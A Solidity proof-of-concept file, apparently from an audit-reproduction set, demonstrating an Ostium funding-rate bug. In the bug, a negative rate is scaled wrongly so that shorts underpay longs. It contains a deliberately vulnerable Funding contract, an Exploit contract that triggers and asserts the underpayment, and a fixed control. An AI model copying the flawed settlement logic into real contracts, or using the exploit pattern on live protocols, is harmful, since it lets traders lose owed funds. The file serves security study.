// SPDX-License-Identifier: MIT
pragma solidity 0.8.27;

/*  Ostium — when accFundingRate is negative the short-side scale is still
    applied, so shorts pay less than the full rate (Pashov, finding #61508,
    21 January 2025).

    SYNTHETIC, cheatcode-free. oiLong = 100, oiShort = 400, rate = -1000.
    The vulnerable settle credits longs 100000 USDC and returns the other
    300000 of a 400000 escrow to the short. Control scales the long side by
    oiShort/oiLong and pays the full 400000. */

contract Token {
    string public name;
    string public symbol;
    uint8 public decimals;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    constructor(string memory _name, string memory _symbol, uint8 _decimals) {
        name = _name;
        symbol = _symbol;
        decimals = _decimals;
    }

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
        totalSupply += amount;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        require(balanceOf[msg.sender] >= amount, "bal");
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        require(balanceOf[from] >= amount, "bal");
        require(allowance[from][msg.sender] >= amount, "allow");
        allowance[from][msg.sender] -= amount;
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

contract Funding {
    Token public usdc;
    address public longTrader;
    address public shortTrader;
    uint256 public oiLong;
    uint256 public oiShort;

    constructor(Token _usdc) {
        usdc = _usdc;
    }

    function init(address _long, address _short, uint256 _oiLong, uint256 _oiShort) external {
        longTrader = _long;
        shortTrader = _short;
        oiLong = _oiLong;
        oiShort = _oiShort;
    }

    function settle(int256 accFundingRate) external returns (uint256 longCredit, uint256 shortRefund) {
        require(accFundingRate < 0, "sign");
        int256 valueLong;
        int256 valueShort;
        if (oiLong > 0) {
            // @> VULN: negative rate is still applied in full to longs, then scaled onto shorts
            valueLong = accFundingRate;
            valueShort = accFundingRate * int256(oiLong) / int256(oiShort);
        }
        longCredit = uint256(-valueLong) * oiLong / 1e18;
        shortRefund = usdc.balanceOf(address(this)) - longCredit;
        usdc.transfer(longTrader, longCredit);
        if (shortRefund != 0) usdc.transfer(shortTrader, shortRefund);
    }
}

contract Exploit {
    uint256 public constant OI_LONG = 100 ether;
    uint256 public constant OI_SHORT = 400 ether;
    int256 public constant RATE = -1000 ether;
    uint256 public constant ESCROW = 400000 ether;
    uint256 public constant LONG_PAID = 100000 ether;
    uint256 public constant SHORT_KEEPS = 300000 ether;

    Token public usdc;
    Funding public funding;
    address public constant LONG = address(0x4444);
    uint256 public longGot;
    uint256 public shortKept;

    constructor() {
        usdc = new Token("USDC", "USDC", 18);
        funding = new Funding(usdc);
        funding.init(LONG, address(this), OI_LONG, OI_SHORT);
        usdc.mint(address(funding), ESCROW);
    }

    function run() external {
        funding.settle(RATE);
        longGot = usdc.balanceOf(LONG);
        shortKept = usdc.balanceOf(address(this));
        require(longGot == LONG_PAID, "long credit");
        require(shortKept == SHORT_KEEPS, "short kept too little");
    }
}

/// @dev Control: a negative rate is paid in full by shorts and scaled up for longs.
contract FundingFixed {
    Token public usdc;
    address public longTrader;
    address public shortTrader;
    uint256 public oiLong;
    uint256 public oiShort;

    constructor(Token _usdc) {
        usdc = _usdc;
    }

    function init(address _long, address _short, uint256 _oiLong, uint256 _oiShort) external {
        longTrader = _long;
        shortTrader = _short;
        oiLong = _oiLong;
        oiShort = _oiShort;
    }

    function settle(int256 accFundingRate) external returns (uint256 longCredit) {
        require(accFundingRate < 0, "sign");
        int256 valueLong = accFundingRate * int256(oiShort) / int256(oiLong);
        longCredit = uint256(-valueLong) * oiLong / 1e18;
        usdc.transfer(longTrader, longCredit);
    }
}
